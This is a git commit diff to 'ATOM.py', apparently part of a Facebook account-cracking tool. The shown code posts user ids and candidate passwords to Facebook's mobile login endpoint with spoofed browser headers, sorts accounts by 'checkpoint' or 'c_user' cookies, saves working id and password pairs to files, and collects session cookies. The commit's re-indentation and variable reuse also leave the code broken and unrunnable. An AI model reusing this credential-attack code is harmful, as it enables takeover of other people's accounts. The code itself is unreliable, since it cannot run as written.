97cd54acee6a0640a9c17d427986050a6e4d7127
DESTROYED-ATOM <164036812+DESTROYED-ATOM@users.noreply.github.com>
2024-03-20 10:42:50 +0530

    Update ATOM.py

--- ATOM.py
+++ ATOM.py
@@ -515,14 +515,14 @@ def _M4_(ids,pasc):
                         heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':pro,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                         po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)  
                         po=session.cookies.get_dict().keys()
-                        if "checkpoint" in po.cookies.get_dict().keys():
+                 if "checkpoint" in po.cookies.get_dict().keys():
                         print(f'\r\033[0;95m[{time.strftime("%H:%M")}•DRACO-Cp] ✅Uid┏━➤ {idf} 🔑Pass┏━➤')
                         os.system('espeak -a 300 " Sorry,  You,  Have,  Got,  Cp,  Id"')
                         open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                         akun.append(idf+' • '+pw)
                         cp+=1
-                        break
-                        elif "c_user" in ses.cookies.get_dict().keys():
+                 break
+                 elif "c_user" in ses.cookies.get_dict().keys():
                         ok+=1
                         coki=po.cookies.get_dict()
                         kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
